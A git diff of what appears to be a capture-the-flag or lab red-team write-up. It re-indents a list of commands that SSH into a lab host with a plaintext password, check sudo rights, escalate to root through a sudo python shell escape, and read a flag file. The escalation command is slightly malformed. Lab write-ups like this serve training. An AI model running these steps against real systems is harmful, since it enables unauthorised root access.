@@ -102,13 +102,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
  
  ![Steven's Priviledges](Screenshots/StevenPriviledges.png)
  
-            - Commands: 
-                - ssh steven@192.168.1.110
-                - pw:pink84
-                - sudo -l
-                - sudo python -c 'import os; os.system("bin/bash/")
-                - cd /root
-                - ls
-                - cat flag4.txt
+ - Commands: 
+   - ssh steven@192.168.1.110
+   - pw:pink84
+   - sudo -l
+   - sudo python -c 'import os; os.system("bin/bash/")
+   - cd /root
+   - ls
+   - cat flag4.txt
                 
 ![Falg 4](Screenshots/flag4.png)
